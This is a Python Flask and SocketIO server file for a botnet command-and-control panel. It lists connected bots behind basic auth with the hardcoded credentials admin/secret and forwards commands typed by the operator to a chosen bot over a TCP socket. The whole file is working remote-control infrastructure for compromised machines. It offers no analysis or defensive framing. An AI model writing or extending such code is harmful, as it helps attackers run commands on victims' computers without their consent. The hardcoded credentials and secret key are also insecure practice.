import socket
from flask import Flask, render_template, session, request, Response
from flask_socketio import SocketIO, emit
from functools import wraps

# Loading library depends on how we want to setup the project later,
# for now this will do
try: from server.botnetclasses import *
except: from botnetclasses import *

''' See accompanying README for TODOs.

 To run: python server.py'''

HOST = 'localhost'
PORT = 1708
connected = ''  # temp variable for testing

# Set this variable to "threading", "eventlet" or "gevent" to test the
# different async modes, or leave it set to None for the application to choose
# the best option based on installed packages.
async_mode = None

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode=async_mode)
thread = None

def check_auth(username, password):
    """This function is called to check if a username /
    password combination is valid.
    """
    return username == 'admin' and password == 'secret' #TODO: set username and password

def authenticate():
    """Sends a 401 response that enables basic auth"""
    return Response(
    'Could not verify your access level for that URL.\n'
    'You have to login with proper credentials', 401,
    {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated


@app.route('/', methods=['GET', 'POST'])
@requires_auth
def index():
    global connected
    if request.method == 'POST':
        select = request.form.get('bot')
        connected = str(select)
    return render_template('index.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
                           connected=connected)


@socketio.on('send_command', namespace='/bot')
def send(cmd):
    # raw_output = b''
    try:
        # raw_output = allConnections[connected].send(cmd['data'])
        botnet.getConnection(connected).send(cmd['data']+"\n")
    except:
        # This emit makes sense since it's exceptional
        emit('response',
             {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(connected), 'user': connected})
    # Look at the "Emitting from an External Process" section:
    # https://flask-socketio.readthedocs.io/en/latest/
    # We will want to "emit from a different process" in the following way:
    # A thread globally checks all targets for stdout/stderr output, then emits anything they
    # have said to the appropriate socketio sessions
    # Therefore the send_receive function should probably only emit the fact that the packets
    # was successfully sent to the target
    # -Sumner

    # if raw_output:
    #     output = json.loads(raw_output)
    #     stdout = output['stdout']
    #     stderr = output['stderr']
    #
    #     # There will not necessarly be
    #     emit('response',
    #          {'stdout': stdout[:-1], 'stderr': stderr[:-1], 'user': connected})

if __name__ == "__main__":
    TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPSOCK.bind((HOST, PORT))
    botnet = BotNet(socketio)
    botserver = BotServer(TCPSOCK,botnet,socketio)
    # botpinger = botnetclasses.BotPinger(botnet)

    botnet.start()
    botserver.start()
    # botpinger.start()

    socketio.run(app, debug=True, use_reloader=False)
